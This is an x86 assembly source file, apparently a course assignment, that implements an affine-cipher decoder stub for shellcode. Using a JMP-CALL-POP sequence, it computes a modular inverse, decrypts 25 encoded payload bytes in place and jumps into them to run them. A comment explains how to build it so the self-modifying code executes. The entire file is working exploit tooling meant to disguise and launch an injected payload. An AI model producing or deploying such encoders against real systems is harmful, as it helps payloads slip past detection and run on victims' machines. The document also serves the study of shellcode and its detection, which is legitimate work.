;Author:   evoche
;License:  GPL

global _start			

section .text 
;section .kode exec write; - use to test directly, avoids segementation fault

_start:

	jmp call_decoder

setup:
	pop esi					;get address of Shellcode
	xor eax, eax			;clear all registers
	xor ebx, ebx
	xor ecx, ecx
	xor edi, edi
	inc edi
	mov cl, 0xFF 			;for this assignment we will only go to 255 iterations to find modulus

MMI:						;get modular multiplicative inverse -- a*(counter)mod 255 = 1 
	mov al, 0x8				;8 is the value of a
	mul di					;a * counter

	xor edx, edx			;modulus setup
	mov bl, 0xFF			;m = 255
	div bx       			;divides AX (which is a*counter) by BX (size of data set m)  -- modulus is stored in DX

	cmp dx, 0x1				;check if the modulus is 1
	je setDecryptLoop		;modulus is 1 - we now have a^-1(MMI)

	inc di					;inc counter
	loop MMI				;modulus is not 1 found keep looping

setDecryptLoop:
	xor ecx, ecx
	xor eax, eax
	mov cl, 0x19			;loop for number of bytes in shellcode

decrypt:					;a^-1(x-b) mod m
	mov al, byte [esi]		;get byte to be decoded/decrypted
	sub al, 0xB				;(x-b)
	mul di					;a^-1(x-b)

	xor edx, edx			;modulus setup
	mov bl, 0xFF			;m = 255
	div bx       			;divides AX (which is a^-1(x-b)) by BX (size of data set m)  -- modulus is stored in DX
	mov byte [esi], dl		;set byte to the decrypted value
	inc esi					;move along to next shellcode byte

	loop decrypt			;keep until all shellcode bytes are decrypted
	jmp Shellcode	 		;decryption is done - execute
	

call_decoder:
	call setup
	Shellcode: db 0x94,0x11,0x8d,0x4e,0x84,0x84,0xa6,0x4e,0x4e,0x84,0x1e,0x56,0x7e,0x57,0x2a,0x8d,0x57,0x22,0xa5,0x57,0x1a,0x90,0x63,0x79,0x0f





